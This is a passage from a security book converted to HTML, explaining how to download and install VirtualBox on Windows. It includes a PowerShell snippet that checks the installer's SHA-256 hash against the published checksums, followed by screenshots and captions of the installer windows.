style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In short, resources for VMs get allocated for the short term, while real hardware resources get purchased for the long term. Once you have the hardware available, it&#8217;s nice knowing whatever VMs might demand, they will have it.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="_bookmark65" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="VirtualBox" ></a>VirtualBox</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >It is not easy selecting one from the options available today. However, for creating VMs for the most common desktop environments, VirtualBox from Oracle is the solution we use.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Installing VirtualBox</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >VirtualBox can be downloaded from</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section48" ><p class=MsoBodyText  style="margin-top:4.0000pt;margin-right:11.1500pt;" ><span><a href="https://www.virtualbox.org/wiki/Downloads" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >https://www.virtualbox.org/wiki/Downloads</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Be sure to select the version that matches your operating system. Notice that on that page you can also download the VirtualBox Extension Pack. <a name="_bookmark66" ></a>This allows for various advanced features, such as USB pass-through and shared folders between the guest and host machine. We walk through how to install the VirtualBox Extension Pack, but it is important to note that these features do not fall under the same open-source license as the rest of VirtualBox, and there are certain restrictions that need to be taken into account if you plan on using the Extensions for anything other than personal use or evaluation. The details of the VirtualBox Personal Use and Evaluation License (PUEL) can be found at </span><span><a href="https://www.virtualbox.org/wiki/VirtualBox_PUEL" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >https://www.virtualbox.org/wiki/VirtualBox_PUEL</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We will walk through the installation of VirtualBox for the Windows operating system. If you happen to be running Linux as your host operating system, we assume that you are familiar with how to install software using the recommended tools for whichever distribution you are running. After downloading the VirtualBox installer, it is simply a matter of double-clicking to start the installation. Depending on your Windows configuration, you may be prompted with a warning stating the file has been downloaded from the Internet and asking if you are sure you want to run it.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="452"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker75457.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section49" ><p class=MsoBodyText  style="margin-top:3.5000pt;margin-right:21.0000pt;margin-left:20.0000pt;line-height:101%;" ><span style="position:absolute;z-index:-1;margin-left:128.7500px;margin-top:119.9167px;width:763.0000px;height:1082.0000px;" ><img width="763"  height="1082"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker75460.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >search program and files box, and pressing Enter. You can copy and paste the following snippet of PowerShell code into the PowerShell window to make sure that you replace the</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-right:52.5000pt;margin-left:20.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >$vboxinstaller</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.4000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >variable with the path to the version of the VirtualBox installer you just downloaded:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:11.6000pt;margin-right:0.0000pt;margin-left:20.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >$algorithm = [Security.Cryptography.HashAlgorithm]::Create("SHA256")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:37.2000pt;margin-left:20.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >$vboxinstaller = 'C:\Users\w4sp\Downloads\VirtualBox-5.0.4- 102546-Win.exe'</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:20.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >$fileBytes = [io.File]::ReadAllBytes($vboxinstaller)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:20.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >$bytes = $algorithm.ComputeHash($fileBytes)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:20.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-Join ($bytes | ForEach {"{0:x2}" -f $_})</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:31.5000pt;margin-left:20.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After pasting all the preceding lines into the PowerShell window, you may need to press Enter, but you should see a string of hex characters as output.<a name="_bookmark67" ></a>&nbsp;</span><span><a href="#_bookmark68" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-1</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shows sample output from running this code on my Windows 7 machine.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:20.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark68" ></a><span><a href="#_bookmark67" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-1:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Getting SHA-256 file hash in PowerShell</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:6.3500pt;margin-left:20.0000pt;" ><a name="_bookmark69" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In my case, the SHA-256 file hash of my installer is 17fe9943eae33d1d23d37160fd862b7c5db0eef8cb48225cf143244d0e To verify, I go back to the VirtualBox download page and click the link for the SHA-256 checksums (see<a name="_bookmark70" ></a>&nbsp;</span><span><a href="#_bookmark71" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-2</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section50" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="position:absolute;z-index:-1;margin-left:128.7500px;margin-top:119.9167px;width:763.0000px;height:659.0000px;" ><img width="763"  height="659"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker76649.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:20.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark71" ></a><span><a href="#_bookmark70" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-2:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >VirtualBox SHA-256 checksums</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:10.0000pt;margin-right:20.3000pt;margin-left:20.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Clicking this link takes you to a web page with a bunch of SHA-256 checksums followed by filenames. Find the filename of the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >installer package that you downloaded. In my case, I downloaded the VirtualBox-5.0.4-102546-Win.exe file. If I check the corresponding checksum, I see that it is the same as the output from my PowerShell code. This should give me a pretty strong level of assurance that the installer package was not modified in transit and is safe for installation. After verifying the checksum, you can get into the installation</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >process.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:19.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:9.0500pt;" ><a name="_bookmark72" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Double-click the installation file to run it. A dialog box appears similar to what is shown in<a name="_bookmark73" ></a>&nbsp;</span><span><a href="#_bookmark74" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-3</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. You need to make sure either that you have administrative privileges on your Windows machine or that you have a means of obtaining the necessary privileges to install VirtualBox.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section51" ><p class=MsoBodyText  style="margin-left:39.5000pt;" ><img width="677"  height="529"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker77606.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark74" ></a><span><a href="#_bookmark73" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-3:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >VirtualBox installation window</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Click Next to continue the installation. The next window, as shown in<a name="_bookmark75" ></a>&nbsp;</span><span><a href="#_bookmark76" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-4</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, allows you to choose which features you want to install.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For our purpose, the default options are acceptable, so just click Next again.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section52" ><p class=MsoBodyText  style="margin-left:39.5000pt;" ><img width="677"  height="529"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker77933.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark76" ></a><span><a href="#_bookmark75" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-4:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >VirtualBox feature selection</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><a name="_bookmark77" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The next window <a name="_bookmark78" ></a>(</span><span><a href="#_bookmark79" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-5</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >) provides the option of creating various shortcuts and the registering of various file extensions. You are more than welcome to uncheck either of the shortcut options, but make sure to keep the checkbox regarding registering file extensions checked.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This will make it so that various files associated with VirtualBox are automatically handled by the VirtualBox application. Again, click Next to proceed with installation.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section53" ><p class=MsoBodyText  style="margin-left:51.5000pt;" ><img width="635"  height="498"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker78490.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark79" ></a><span><a href="#_bookmark78" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-5:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >VirtualBox shortcut creation</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The next window <a name="_bookmark80" ></a>(</span><span><a href="#_bookmark81" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-6</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >) provides a warning that the VirtualBox networking features will cause a temporary network disruption.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Proceed with the installation by clicking Yes.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="192.5"  height="0" ></td></tr><tr><td></td><td><img width="635"  height="403"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker78774.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:11.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
